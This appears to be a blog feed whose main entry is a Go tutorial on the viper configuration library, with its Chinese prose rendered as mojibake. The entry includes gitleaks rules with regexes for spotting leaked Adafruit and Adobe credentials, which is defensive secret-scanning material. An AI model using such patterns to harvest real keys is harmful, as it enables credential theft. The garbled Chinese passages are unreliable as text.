        <content type="html"><![CDATA[<p>github.com/spf13/viper: è¯»å–é…ç½®æ–‡ä»¶</p><ul><li><a href="#ä¼˜å…ˆçº§">ä¼˜å…ˆçº§</a></li><li><a href="#ç›´æ¥è®¾ç½®ç¯å¢ƒ">ç›´æ¥è®¾ç½®ç¯å¢ƒ</a></li><li><a href="#è¯»å–é…ç½®æ–‡ä»¶">è¯»å–é…ç½®æ–‡ä»¶</a><ul><li><a href="#1-viperreadconfig--è¯»å–rawçš„é…ç½®æ–‡ä»¶æœ¬èº«">1. viper.ReadConfig: # è¯»å–rawçš„é…ç½®æ–‡ä»¶æœ¬èº«</a></li><li><a href="#2-viperreadinconfig--viperreadinconfigè¯»å–æŸä¸ªé…ç½®æ–‡ä»¶">2. viper.ReadInConfig() # viper.ReadInConfig()è¯»å–æŸä¸ªé…ç½®æ–‡ä»¶</a></li></ul></li><li><a href="#å†™é…ç½®æ–‡ä»¶">å†™é…ç½®æ–‡ä»¶</a></li><li><a href="#run-timeæ—¶ç›¯é…ç½®æ–‡ä»¶æ˜¯å¦æœ‰å¼‚åŠ¨çƒ­åŠ è½½é…ç½®å› æ­¤ä¸éœ€è¦é‡å¯æœåŠ¡å™¨å°±èƒ½è®©é…ç½®ç”Ÿæ•ˆ">Run timeæ—¶ç›¯é…ç½®æ–‡ä»¶æ˜¯å¦æœ‰å¼‚åŠ¨çƒ­åŠ è½½é…ç½®ã€‚å› æ­¤ä¸éœ€è¦é‡å¯æœåŠ¡å™¨ï¼Œå°±èƒ½è®©é…ç½®ç”Ÿæ•ˆã€‚</a></li><li><a href="#gitleaksæ¡ˆä¾‹è¯»å–ruleè¿™ç§åˆ—è¡¨çš„tomlæ•°æ®">gitleaksæ¡ˆä¾‹:è¯»å–[[Rule]]è¿™ç§åˆ—è¡¨çš„tomlæ•°æ®</a></li><li><a href="#è®¾ç½®åˆ«å">è®¾ç½®åˆ«å</a></li><li><a href="#ä»ioreaderè¯»å–é…ç½®ä¾‹è¯»å–bindataæ‰“åŒ…æ–‡ä»¶åˆ°viper">ä»io.Readerè¯»å–é…ç½®ï¼Œä¾‹ï¼šè¯»å–bindataæ‰“åŒ…æ–‡ä»¶åˆ°viper</a></li><li><a href="#ç»‘å®šç¯å¢ƒå˜é‡">ç»‘å®šç¯å¢ƒå˜é‡</a></li><li><a href="#å‰ç¼€çš„è®¾ç½®">å‰ç¼€çš„è®¾ç½®</a></li><li><a href="#unmarshalåˆ°ç»“æ„ä½“ä¸­">Unmarshalåˆ°ç»“æ„ä½“ä¸­</a></li><li><a href="#viperå’Œcobraç»“åˆ">viperå’Œcobraç»“åˆ</a></li><li><a href="#viperå’Œpflagç»“åˆ">viperå’Œpflagç»“åˆ</a></li><li><a href="#gitleaksæ¡ˆä¾‹åŒviperè¦æ±‚è¯»å–2ä¸ªé…ç½®æ–‡ä»¶åè€…è¦†ç›–å‰è€…">gitleaksæ¡ˆä¾‹ï¼šåŒviperè¦æ±‚è¯»å–2ä¸ªé…ç½®æ–‡ä»¶ï¼Œåè€…è¦†ç›–å‰è€…</a></li><li><a href="#å°†viperä¸­çš„tomlè¯»å–åˆ°ç»“æ„ä½“">å°†viperä¸­çš„tomlè¯»å–åˆ°ç»“æ„ä½“</a></li></ul><p>å‚è€ƒé“¾æ¥ï¼š<br>    <a href="https://github.com/spf13/viper">https://github.com/spf13/viper</a><br>    <a href="https://juejin.cn/post/6844904051369312264">https://juejin.cn/post/6844904051369312264</a></p><h3 id="ä¼˜å…ˆçº§"><a href="#ä¼˜å…ˆçº§" class="headerlink" title="ä¼˜å…ˆçº§"></a>ä¼˜å…ˆçº§</h3><pre><code>explicit call to Setflagenvconfigkey/value storedefault</code></pre><h3 id="ç›´æ¥è®¾ç½®ç¯å¢ƒ"><a href="#ç›´æ¥è®¾ç½®ç¯å¢ƒ" class="headerlink" title="ç›´æ¥è®¾ç½®ç¯å¢ƒ"></a>ç›´æ¥è®¾ç½®ç¯å¢ƒ</h3><pre><code>viper.SetDefault(&quot;ContentDir&quot;, &quot;content&quot;)viper.SetDefault(&quot;LayoutDir&quot;, &quot;layouts&quot;)viper.SetDefault(&quot;Taxonomies&quot;, map[string]string&#123;&quot;tag&quot;: &quot;tags&quot;, &quot;category&quot;: &quot;categories&quot;&#125;)</code></pre><h3 id="è¯»å–é…ç½®æ–‡ä»¶"><a href="#è¯»å–é…ç½®æ–‡ä»¶" class="headerlink" title="è¯»å–é…ç½®æ–‡ä»¶"></a>è¯»å–é…ç½®æ–‡ä»¶</h3><p>æ”¯æŒé…ç½®æ–‡ä»¶æ ¼å¼ï¼šJSON, TOML, YAML, HCL, INI, envfile and Java Properties files</p><p>æ³¨æ„ï¼šviperçš„é…ç½®çš„é”®å€¼æ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„ï¼Œå¯¹ç¯å¢ƒå˜é‡æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚ä¸€ä¸ªviperå®ä¾‹æ”¯æŒå¤šä¸ªè·¯å¾„ç¯å¢ƒï¼ˆä½†æ˜¯è‡³å°‘å¾—æä¾›ä¸€ä¸ªï¼‰ï¼Œä½†æ˜¯åªæ”¯æŒè§£æ1ä¸ªé…ç½®æ–‡ä»¶</p><p>å¦å¤–æ³¨æ„ï¼Œåœ¨å†™gitleaksæ‰“åŒ…é¡¹ç›®æ—¶æ³¨æ„åˆ°ï¼Œviperåœ¨è¿›è¡Œé…ç½®æ—¶å¯ä»¥é…ç½®è·¯å¾„ã€åŸç”Ÿçš„é…ç½®æ–‡ä»¶ã€åç¼€åç­‰ç­‰ï¼Œä½†æ˜¯è¯»å–çš„è¡Œä¸ºåŸºæœ¬ä¸Šæ—¶è¿™ä¸¤ä¸ªå‡½æ•°ï¼š<br>Eg:</p><h5 id="1-viper-ReadConfig-è¯»å–rawçš„é…ç½®æ–‡ä»¶æœ¬èº«"><a href="#1-viper-ReadConfig-è¯»å–rawçš„é…ç½®æ–‡ä»¶æœ¬èº«" class="headerlink" title="1. viper.ReadConfig: # è¯»å–rawçš„é…ç½®æ–‡ä»¶æœ¬èº«"></a>1. viper.ReadConfig: # è¯»å–rawçš„é…ç½®æ–‡ä»¶æœ¬èº«</h5><pre><code>bindata_default_toml, _ := bindata.Asset(&quot;gitleaks-n-all-kill.toml&quot;)viper.SetConfigType(&quot;toml&quot;)if err := viper.ReadConfig(bytes.NewBuffer(bindata_default_toml)); err != nil &#123;    log.Fatal().Msgf(&quot;unable to load gitleaks config, err: %s&quot;, err)&#125;</code></pre><h5 id="2-viper-ReadInConfig-viper-ReadInConfig-è¯»å–æŸä¸ªé…ç½®æ–‡ä»¶"><a href="#2-viper-ReadInConfig-viper-ReadInConfig-è¯»å–æŸä¸ªé…ç½®æ–‡ä»¶" class="headerlink" title="2. viper.ReadInConfig() # viper.ReadInConfig()è¯»å–æŸä¸ªé…ç½®æ–‡ä»¶"></a>2. viper.ReadInConfig() # viper.ReadInConfig()è¯»å–æŸä¸ªé…ç½®æ–‡ä»¶</h5><pre><code>viper.SetConfigFile(cfgPath)          fmt.Print(&quot;å·²åŠ è½½configå‚æ•°&quot;)if err := viper.ReadInConfig(); err != nil &#123;    log.Fatal().Msgf(&quot;unable to load gitleaks config, err: %s&quot;, err)&#125;viper.SetConfigName(&quot;config&quot;) // name of config file (without extension)viper.SetConfigType(&quot;yaml&quot;) // REQUIRED if the config file does not have the extension in the nameviper.AddConfigPath(&quot;/etc/appname/&quot;)   // path to look for the config file inviper.AddConfigPath(&quot;$HOME/.appname&quot;)  // call multiple times to add many search pathsviper.AddConfigPath(&quot;.&quot;)               // optionally look for config in the working directoryerr := viper.ReadInConfig() // Find and read the config fileif err != nil &#123; // Handle errors reading the config file    panic(fmt.Errorf(&quot;fatal error config file: %w&quot;, err))&#125;if err := viper.ReadInConfig(); err != nil &#123;    if _, ok := err.(viper.ConfigFileNotFoundError); ok &#123;        // Config file not found; ignore error if desired    &#125; else &#123;        // Config file was found but another error was produced    &#125;&#125;// Config file found and successfully parsed</code></pre><p>å¦ä¸€ä¸ªæ¡ˆä¾‹</p><pre><code>package main import ( &quot;fmt&quot; &quot;log&quot; &quot;github.com/spf13/viper&quot; ) func main() &#123;     viper.SetConfigName(&quot;config&quot;) viper.SetConfigType(&quot;toml&quot;) viper.AddConfigPath(&quot;.&quot;) //viper.ReadInConfig() ä¹‹å‰ï¼Œå¯ä»¥å…ˆè®¾ç½®ä¸ªé»˜è®¤å€¼ï¼Œé…ç½®æ–‡ä»¶æ­¤æ—¶è¿˜æ²¡è§£æï¼Œè§£æå‡ºæ¥ä»–è‡ªåŠ¨è¦†ç›–è¿™ä¸ªé»˜è®¤å€¼viper.SetDefault(&quot;redis.port&quot;, 6381)err := viper.ReadInConfig() if err != nil &#123; log.Fatal(&quot;read config failed: %v&quot;, err) &#125; fmt.Println(viper.Get(&quot;app_name&quot;)) fmt.Println(viper.Get(&quot;log_level&quot;)) fmt.Println(&quot;mysql ip: &quot;, viper.Get(&quot;mysql.ip&quot;)) fmt.Println(&quot;mysql port: &quot;, viper.Get(&quot;mysql.port&quot;)) fmt.Println(&quot;mysql user: &quot;, viper.Get(&quot;mysql.user&quot;)) fmt.Println(&quot;mysql password: &quot;, viper.Get(&quot;mysql.password&quot;)) fmt.Println(&quot;mysql database: &quot;, viper.Get(&quot;mysql.database&quot;)) fmt.Println(&quot;redis ip: &quot;, viper.Get(&quot;redis.ip&quot;)) fmt.Println(&quot;redis port: &quot;, viper.Get(&quot;redis.port&quot;)) &#125;</code></pre><h3 id="å†™é…ç½®æ–‡ä»¶"><a href="#å†™é…ç½®æ–‡ä»¶" class="headerlink" title="å†™é…ç½®æ–‡ä»¶"></a>å†™é…ç½®æ–‡ä»¶</h3><pre><code>viper.WriteConfig() // writes current config to predefined path set by &#39;viper.AddConfigPath()&#39; and &#39;viper.SetConfigName&#39;viper.SafeWriteConfig()viper.WriteConfigAs(&quot;/path/to/my/.config&quot;)viper.SafeWriteConfigAs(&quot;/path/to/my/.config&quot;) // will error since it has already been writtenviper.SafeWriteConfigAs(&quot;/path/to/my/.other_config&quot;)</code></pre><h3 id="Run-timeæ—¶ç›¯é…ç½®æ–‡ä»¶æ˜¯å¦æœ‰å¼‚åŠ¨çƒ­åŠ è½½é…ç½®ã€‚å› æ­¤ä¸éœ€è¦é‡å¯æœåŠ¡å™¨ï¼Œå°±èƒ½è®©é…ç½®ç”Ÿæ•ˆã€‚"><a href="#Run-timeæ—¶ç›¯é…ç½®æ–‡ä»¶æ˜¯å¦æœ‰å¼‚åŠ¨çƒ­åŠ è½½é…ç½®ã€‚å› æ­¤ä¸éœ€è¦é‡å¯æœåŠ¡å™¨ï¼Œå°±èƒ½è®©é…ç½®ç”Ÿæ•ˆã€‚" class="headerlink" title="Run timeæ—¶ç›¯é…ç½®æ–‡ä»¶æ˜¯å¦æœ‰å¼‚åŠ¨çƒ­åŠ è½½é…ç½®ã€‚å› æ­¤ä¸éœ€è¦é‡å¯æœåŠ¡å™¨ï¼Œå°±èƒ½è®©é…ç½®ç”Ÿæ•ˆã€‚"></a>Run timeæ—¶ç›¯é…ç½®æ–‡ä»¶æ˜¯å¦æœ‰å¼‚åŠ¨çƒ­åŠ è½½é…ç½®ã€‚å› æ­¤ä¸éœ€è¦é‡å¯æœåŠ¡å™¨ï¼Œå°±èƒ½è®©é…ç½®ç”Ÿæ•ˆã€‚</h3><pre><code>viper.OnConfigChange(func(e fsnotify.Event) &#123;    fmt.Println(&quot;Config file changed:&quot;, e.Name)&#125;)viper.WatchConfig()</code></pre><p>å¦‚ï¼š<br>    package main</p><pre><code>import (&quot;fmt&quot;&quot;log&quot;&quot;time&quot;&quot;github.com/spf13/viper&quot;)func main() &#123;viper.SetConfigName(&quot;config&quot;)viper.SetConfigType(&quot;toml&quot;)viper.AddConfigPath(&quot;.&quot;)err := viper.ReadInConfig()if err != nil &#123;    log.Fatal(&quot;read config failed: %v&quot;, err)&#125;viper.WatchConfig()fmt.Println(&quot;redis port before sleep: &quot;, viper.Get(&quot;redis.port&quot;))time.Sleep(time.Second * 10)fmt.Println(&quot;redis port after sleep: &quot;, viper.Get(&quot;redis.port&quot;))&#125;</code></pre><p>åªéœ€è¦è°ƒç”¨<code>viper.WatchConfig</code>ï¼Œviper ä¼šè‡ªåŠ¨ç›‘å¬é…ç½®ä¿®æ”¹ã€‚å¦‚æœæœ‰ä¿®æ”¹ï¼Œé‡æ–°åŠ è½½çš„é…ç½®ã€‚<br>ä¸Šé¢ç¨‹åºä¸­ï¼Œæˆ‘ä»¬å…ˆæ‰“å°redis.portçš„å€¼ï¼Œç„¶åSleep 10sã€‚åœ¨è¿™æœŸé—´ä¿®æ”¹é…ç½®ä¸­redis.portçš„å€¼ï¼ŒSleepç»“æŸåå†æ¬¡æ‰“å°ã€‚</p><p>å¦å¤–ï¼Œè¿˜å¯ä»¥ä¸ºé…ç½®ä¿®æ”¹å¢åŠ ä¸€ä¸ªå›è°ƒï¼š</p><pre><code>viper.OnConfigChange(func(e fsnotify.Event) &#123;fmt.Printf(&quot;Config file:%s Op:%s\n&quot;, e.Name, e.Op)&#125;)</code></pre><p>è¿™æ ·æ–‡ä»¶ä¿®æ”¹æ—¶ä¼šæ‰§è¡Œè¿™ä¸ªå›è°ƒã€‚</p><p>viper ä½¿ç”¨<code>fsnotify</code>è¿™ä¸ªåº“æ¥å®ç°ç›‘å¬æ–‡ä»¶ä¿®æ”¹çš„åŠŸèƒ½ã€‚</p><h3 id="gitleaksæ¡ˆä¾‹-è¯»å–-Rule-è¿™ç§åˆ—è¡¨çš„tomlæ•°æ®"><a href="#gitleaksæ¡ˆä¾‹-è¯»å–-Rule-è¿™ç§åˆ—è¡¨çš„tomlæ•°æ®" class="headerlink" title="gitleaksæ¡ˆä¾‹:è¯»å–[[Rule]]è¿™ç§åˆ—è¡¨çš„tomlæ•°æ®"></a>gitleaksæ¡ˆä¾‹:è¯»å–[[Rule]]è¿™ç§åˆ—è¡¨çš„tomlæ•°æ®</h3><p>å¦‚è¿™é‡Œç»“æ„ä½“å†™çš„ Rules æ˜¯ä¸€ä¸ª []</p><pre><code>type ViperConfig struct &#123;    Description string    Extend      Extend    Rules       []struct &#123;        ID          string        Description string        Entropy     float64        SecretGroup int        Regex       string        Keywords    []string        Path        string        Tags        []string        Allowlist struct &#123;            Regexes   []string            Paths     []string            Commits   []string            StopWords []string        &#125;    &#125;    Allowlist struct &#123;        Regexes   []string        Paths     []string        Commits   []string        StopWords []string    &#125;&#125;</code></pre><p>åœ¨tomlä¸­ï¼Œå…¶é…ç½®å†…å®¹å¦‚ä¸‹ï¼Œæ˜¯å¤šä¸ª<code>[[Rules]]</code>è¿™ç§å†™æ³•</p><pre><code># [ GitLeaksåŸæœ¬çš„è§„åˆ™ ][[rules]]description = &quot;åº”ç”¨å‡­è¯--Adafruit API Key&quot;id = &quot;adafruit-api-key&quot;regex = &#39;&#39;&#39;(?i)(?:adafruit)(?:[0-9a-z\-_\t .]&#123;0,20&#125;)(?:[\s|&#39;]|[\s|&quot;])&#123;0,3&#125;(?:=|&gt;|:=|\|\|:|&lt;=|=&gt;|:)(?:&#39;|\&quot;|\s|=|\x60)&#123;0,5&#125;([a-z0-9_-]&#123;32&#125;)(?:[&#39;|\&quot;|\n|\r|\s|\x60|;]|$)&#39;&#39;&#39;secretGroup = 1keywords = [    &quot;adafruit&quot;,][[rules]]description = &quot;åº”ç”¨å‡­è¯--Adobe Client ID (OAuth Web)&quot;id = &quot;adobe-client-id&quot;regex = &#39;&#39;&#39;(?i)(?:adobe)(?:[0-9a-z\-_\t .]&#123;0,20&#125;)(?:[\s|&#39;]|[\s|&quot;])&#123;0,3&#125;(?:=|&gt;|:=|\|\|:|&lt;=|=&gt;|:)(?:&#39;|\&quot;|\s|=|\x60)&#123;0,5&#125;([a-f0-9]&#123;32&#125;)(?:[&#39;|\&quot;|\n|\r|\s|\x60|;]|$)&#39;&#39;&#39;secretGroup = 1keywords = [    &quot;adobe&quot;,]</code></pre><h3 id="è®¾ç½®åˆ«å"><a href="#è®¾ç½®åˆ«å" class="headerlink" title="è®¾ç½®åˆ«å"></a>è®¾ç½®åˆ«å</h3><pre><code>viper.RegisterAlias(&quot;loud&quot;, &quot;Verbose&quot;)viper.Set(&quot;verbose&quot;, true) // same result as next lineviper.Set(&quot;loud&quot;, true)   // same result as prior lineviper.GetBool(&quot;loud&quot;) // trueviper.GetBool(&quot;verbose&quot;) // true</code></pre><h3 id="ä»io-Readerè¯»å–é…ç½®ï¼Œä¾‹ï¼šè¯»å–bindataæ‰“åŒ…æ–‡ä»¶åˆ°viper"><a href="#ä»io-Readerè¯»å–é…ç½®ï¼Œä¾‹ï¼šè¯»å–bindataæ‰“åŒ…æ–‡ä»¶åˆ°viper" class="headerlink" title="ä»io.Readerè¯»å–é…ç½®ï¼Œä¾‹ï¼šè¯»å–bindataæ‰“åŒ…æ–‡ä»¶åˆ°viper"></a>ä»io.Readerè¯»å–é…ç½®ï¼Œä¾‹ï¼šè¯»å–bindataæ‰“åŒ…æ–‡ä»¶åˆ°viper</h3><pre><code>viper.SetConfigType(&quot;yaml&quot;) // or viper.SetConfigType(&quot;YAML&quot;)// any approach to require this configuration into your program.var yamlExample = []byte(`Hacker: truename: stevehobbies:- skateboarding- snowboarding- goclothing:jacket: leathertrousers: denimage: 35eyes : brownbeard: true`)viper.ReadConfig(bytes.NewBuffer(yamlExample))viper.Get(&quot;name&quot;) // this would be &quot;steve&quot;</code></pre><h3 id="ç»‘å®šç¯å¢ƒå˜é‡"><a href="#ç»‘å®šç¯å¢ƒå˜é‡" class="headerlink" title="ç»‘å®šç¯å¢ƒå˜é‡"></a>ç»‘å®šç¯å¢ƒå˜é‡</h3><pre><code>func init() &#123; // ç»‘å®šç¯å¢ƒå˜é‡ viper.BindEnv(&quot;redis.port&quot;) viper.BindEnv(&quot;go.path&quot;, &quot;GOPATH&quot;) &#125; func main() &#123; // çœç•¥éƒ¨åˆ†ä»£ç  fmt.Println(&quot;go path: &quot;, viper.Get(&quot;go.path&quot;)) &#125;</code></pre><p>è°ƒç”¨BindEnvæ–¹æ³•ï¼Œå¦‚æœåªä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œåˆ™è¿™ä¸ªå‚æ•°æ—¢è¡¨ç¤ºé”®åï¼Œåˆè¡¨ç¤ºç¯å¢ƒå˜é‡åã€‚ å¦‚æœä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œåˆ™ç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºé”®åï¼Œç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºç¯å¢ƒå˜é‡åã€‚</p><p>è¿˜å¯ä»¥é€šè¿‡viper.SetEnvPrefixæ–¹æ³•è®¾ç½®ç¯å¢ƒå˜é‡å‰ç¼€ï¼Œè¿™æ ·ä¸€æ¥ï¼Œé€šè¿‡AutomaticEnvå’Œä¸€ä¸ªå‚æ•°çš„BindEnvç»‘å®šçš„ç¯å¢ƒå˜é‡ï¼Œ åœ¨ä½¿ç”¨Getçš„æ—¶å€™ï¼Œviper ä¼šè‡ªåŠ¨åŠ ä¸Šè¿™ä¸ªå‰ç¼€å†ä»ç¯å¢ƒå˜é‡ä¸­æŸ¥æ‰¾ã€‚</p><p>å¦‚æœå¯¹åº”çš„ç¯å¢ƒå˜é‡ä¸å­˜åœ¨ï¼Œviper ä¼šè‡ªåŠ¨å°†é”®åå…¨éƒ¨è½¬ä¸ºå¤§å†™å†æŸ¥æ‰¾ä¸€æ¬¡ã€‚æ‰€ä»¥ï¼Œä½¿ç”¨é”®ågopathä¹Ÿèƒ½è¯»å–ç¯å¢ƒå˜é‡GOPATHçš„å€¼ã€‚</p><h3 id="å‰ç¼€çš„è®¾ç½®"><a href="#å‰ç¼€çš„è®¾ç½®" class="headerlink" title="å‰ç¼€çš„è®¾ç½®"></a>å‰ç¼€çš„è®¾ç½®</h3><pre><code>SetEnvPrefix(&quot;spf&quot;) // will be uppercased automaticallyBindEnv(&quot;id&quot;)os.Setenv(&quot;SPF_ID&quot;, &quot;13&quot;) // typically done outside of the appid := Get(&quot;id&quot;) // 13</code></pre><h3 id="Unmarshalåˆ°ç»“æ„ä½“ä¸­"><a href="#Unmarshalåˆ°ç»“æ„ä½“ä¸­" class="headerlink" title="Unmarshalåˆ°ç»“æ„ä½“ä¸­"></a>Unmarshalåˆ°ç»“æ„ä½“ä¸­</h3><pre><code>package main import ( &quot;fmt&quot; &quot;log&quot; &quot;github.com/spf13/viper&quot; ) type Config struct &#123; AppName string LogLevel string MySQL MySQLConfig Redis RedisConfig &#125; type MySQLConfig struct &#123; IP string Port int User string Password string Database string &#125; type RedisConfig struct &#123; IP string Port int &#125; func main() &#123; viper.SetConfigName(&quot;config&quot;) viper.SetConfigType(&quot;toml&quot;) viper.AddConfigPath(&quot;.&quot;) err := viper.ReadInConfig() if err != nil &#123; log.Fatal(&quot;read config failed: %v&quot;, err) &#125; var c Config viper.Unmarshal(&amp;c) fmt.Println(c.MySQL) &#125;</code></pre><h3 id="viperå’Œcobraç»“åˆ"><a href="#viperå’Œcobraç»“åˆ" class="headerlink" title="viperå’Œcobraç»“åˆ"></a>viperå’Œcobraç»“åˆ</h3><pre><code>serverCmd.Flags().Int(&quot;port&quot;, 1138, &quot;Port to run Application server on&quot;)viper.BindPFlag(&quot;port&quot;, serverCmd.Flags().Lookup(&quot;port&quot;))</code></pre><h3 id="viperå’Œpflagç»“åˆ"><a href="#viperå’Œpflagç»“åˆ" class="headerlink" title="viperå’Œpflagç»“åˆ"></a>viperå’Œpflagç»“åˆ</h3><pre><code>pflag.Int(&quot;flagname&quot;, 1234, &quot;help message for flagname&quot;)pflag.Parse()viper.BindPFlags(pflag.CommandLine)i := viper.GetInt(&quot;flagname&quot;) // retrieve values from viper instead of pflag</code></pre><p>æˆ–è€…æ˜¯ï¼š</p><pre><code>func init() &#123; pflag.Int(&quot;redis.port&quot;, 8381, &quot;Redis port to connect&quot;) // ç»‘å®šå‘½ä»¤è¡Œ viper.BindPFlags(pflag.CommandLine) &#125;</code></pre><h3 id="gitleaksæ¡ˆä¾‹ï¼šåŒviperè¦æ±‚è¯»å–2ä¸ªé…ç½®æ–‡ä»¶ï¼Œåè€…è¦†ç›–å‰è€…"><a href="#gitleaksæ¡ˆä¾‹ï¼šåŒviperè¦æ±‚è¯»å–2ä¸ªé…ç½®æ–‡ä»¶ï¼Œåè€…è¦†ç›–å‰è€…" class="headerlink" title="gitleaksæ¡ˆä¾‹ï¼šåŒviperè¦æ±‚è¯»å–2ä¸ªé…ç½®æ–‡ä»¶ï¼Œåè€…è¦†ç›–å‰è€…"></a>gitleaksæ¡ˆä¾‹ï¼šåŒviperè¦æ±‚è¯»å–2ä¸ªé…ç½®æ–‡ä»¶ï¼Œåè€…è¦†ç›–å‰è€…</h3><p>æ­¤æ¬¡æ¡ˆä¾‹å‚è€ƒé“¾æ¥: <a href="https://treexie.gitbook.io/articles/viper">https://treexie.gitbook.io/articles/viper</a></p><p>èƒŒæ™¯: è¦æ±‚æ‰“åŒ…gitleaksï¼ŒæŠŠtomlçš„é»˜è®¤é…ç½®æ–‡ä»¶åµŒå¥—è¿›å»ï¼Œç„¶åè¯¥é»˜è®¤çš„é…ç½®æ–‡ä»¶æˆ‘ä»¬å¯æ§ï¼Œä¸”æ”¯æŒç”¨æˆ·å¯¹å…¶ä¸­æŸä¸ªå•æ¡çš„é…ç½®è§„åˆ™çš„ä¿®æ”¹æˆ–è€…æ·»åŠ ã€‚</p><p>å‚è€ƒé“¾æ¥ä¸­ç¤ºä¾‹å¦‚ä¸‹:</p><pre><code>func initConfig() (err error) &#123;    configType := &quot;yml&quot;    defaultPath := &quot;./configs&quot;    v := viper.New()    // ä»defaultä¸­è¯»å–é»˜è®¤çš„é…ç½®    v.SetConfigName(&quot;default&quot;)    v.AddConfigPath(defaultPath)    v.SetConfigType(configType)    err = v.ReadInConfig()    if err != nil &#123;        return    &#125;    configs := v.AllSettings()    // å°†defaultä¸­çš„é…ç½®å…¨éƒ¨ä»¥é»˜è®¤é…ç½®å†™å…¥    for k, v := range configs &#123;        viper.SetDefault(k, v)    &#125; // åœ¨è¿™é‡Œä½¿ç”¨åˆ°äº†viper.Setçš„æ–¹å¼è®¾ç½®å€¼ã€‚ æœ‰Set()å’ŒSetDefault() ä¸¤ä¸ªæ–¹æ³•    env := os.Getenv(&quot;GO_ENV&quot;)    // æ ¹æ®é…ç½®çš„envè¯»å–ç›¸åº”çš„é…ç½®ä¿¡æ¯    if env != &quot;&quot; &#123;        viper.SetConfigName(env)        viper.AddConfigPath(defaultPath)        viper.SetConfigType(configType)        err = viper.ReadInConfig()// è¿™é‡Œç»§ç»­é‡å¤è¿›è¡Œè¯»å–        if err != nil &#123;            return        &#125;    &#125;    return&#125;</code></pre><p>é‡æ¥è¿›è¡Œèµ‹å€¼ä¼ é€’</p><pre><code>// å¤„ç†[allowlist] å¼€å§‹        if user_custom_configs[&quot;allowlist&quot;] != nil &#123;            var tmpConfigAllowlist map[string]interface&#123;&#125;            tmpConfigAllowlist = make(map[string]interface&#123;&#125;)            for k, v := range configs[&quot;allowlist&quot;].(map[string]interface&#123;&#125;) &#123;                tmpConfigAllowlist[k] = v                //fmt.Println(k)                //fmt.Println(v)            &#125;            user_custom_configs_allowlist := user_custom_configs[&quot;allowlist&quot;].(map[string]interface&#123;&#125;)            for k, v := range user_custom_configs_allowlist &#123;                if k == &quot;paths&quot; &#123;                    tmpConfigAllowlist[k] = v                &#125;            &#125;            configs[&quot;allowlist&quot;] = tmpConfigAllowlist        &#125;</code></pre><h3 id="å°†viperä¸­çš„tomlè¯»å–åˆ°ç»“æ„ä½“"><a href="#å°†viperä¸­çš„tomlè¯»å–åˆ°ç»“æ„ä½“" class="headerlink" title="å°†viperä¸­çš„tomlè¯»å–åˆ°ç»“æ„ä½“"></a>å°†viperä¸­çš„tomlè¯»å–åˆ°ç»“æ„ä½“</h3><p>ç»è¿‡æµ‹è¯•ï¼Œæ ‡æ³¨çš„  Description string <code>toml:&quot;description&quot;</code><br>æ­¤å¤„æœ€å¥½ä¸è¦å†™tomlï¼Œè€Œæ˜¯å†™æˆ <code>mapstructure:&quot;advice&quot;</code>,ä¼šå°‘ä¸€äº›è¯»å–ä¸åˆ°çš„å¥‡å¥‡æ€ªæ€ªçš„é”™è¯¯</p><p>output.toml</p><pre><code># gitlab version with risk[version]# admin setting[settings][settings.password]check_rule=&quot;å¯†ç å¤æ‚åº¦æ£€æµ‹&quot;check_rule_en=&quot;password_complex&quot;description=&quot;å¯†ç å¤æ‚åº¦æ£€æµ‹&quot;advice=&quot;å¯†ç å¤æ‚åº¦æ£€æµ‹&quot;[settings.password.length]check_rule=&quot;æœ€å°é•¿åº¦&quot;check_rule_en=&quot;password_least_length&quot;description=&quot;æœ€å°é•¿åº¦&quot;advice=&quot;è¦æ±‚æ•°å­—&quot;</code></pre><p>å†™çš„ç»“æ„ä½“</p><pre><code>type Output struct &#123;    Settings struct &#123;        Password struct &#123;            CheckRule   string `mapstructure:&quot;check_rule&quot;`            CheckRuleEn string `mapstructure:&quot;check_rule_en&quot;`            Description string `mapstructure:&quot;description&quot;`            Advice      string `mapstructure:&quot;advice&quot;`            Length      struct &#123;                CheckRule   string `mapstructure:&quot;check_rule&quot;`                Description string `mapstructure:&quot;description&quot;`                Advice      string `mapstructure:&quot;advice&quot;`            &#125; `toml:&quot;length&quot;`            Num struct &#123;                CheckRule   string `mapstructure:&quot;check_rule&quot;`                Description string `mapstructure:&quot;description&quot;`                Advice      string `mapstructure:&quot;advice&quot;`            &#125; `toml:&quot;num&quot;`            Upper struct &#123;                CheckRule   string `mapstructure:&quot;check_rule&quot;`                Description string `mapstructure:&quot;description&quot;`                Advice      string `mapstructure:&quot;advice&quot;`            &#125; `toml:&quot;upper&quot;`            Lower struct &#123;                CheckRule   string `mapstructure:&quot;check_rule&quot;`                Description string `toml:&quot;description&quot;`                Advice      string `toml:&quot;advice&quot;`            &#125; `toml:&quot;lower&quot;`            Special struct &#123;                CheckRule   string `toml:&quot;check_rule&quot;`                Description string `toml:&quot;description&quot;`                Advice      string `toml:&quot;advice&quot;`            &#125; `toml:&quot;special&quot;`        &#125; `toml:&quot;password&quot;`    &#125; `toml:&quot;settings&quot;`&#125;</code></pre><p>viperè¯»å–é…ç½®æ–‡ä»¶åè¯»å–åˆ°ç»“æ„ä½“ä¸­</p><pre><code>func (o *Output) GetDefault() &#123;    outputConfig := viper.New()    bindataOutputDefaultToml, _ := bindata.Asset(&quot;output.toml&quot;)    outputConfig.SetConfigType(&quot;toml&quot;)    if err := outputConfig.ReadConfig(bytes.NewBuffer(bindataOutputDefaultToml)); err != nil &#123;        panic(&quot;unable to load output config&quot;)        panic(err)    &#125;    outputConfig.Unmarshal(o)&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>go mod init without cobra</title>
      <link href="/2024/08/24/Go/goModInit/"/>
      <url>/2024/08/24/Go/goModInit/</url>
      
        <content type="html"><![CDATA[<p>I wrote an article about how <strong>cobra</strong> inits a golang mod, and I think maybe cobra is more common and frequent. This page is describing without cobra.</p><p>If you want to build a golang model:</p><ol><li>create a directory, for example, I want to create a project named â€˜xxxâ€™, then just create it</li><li>cd into the directory, and execute command <code>go mod init github.com/senranja/xxx</code>, then you would see there is a <code>go.mod</code></li><li>Then my case changes into another existent golang project.</li><li>how to <code>import modules</code> and update the <code>go mod</code>?</li></ol><p><img src="/2024/08/24/Go/goModInit/GolangMod.png" alt="GolangMod"></p><p>In goland, normally you can see in its builtin fire exploration, there 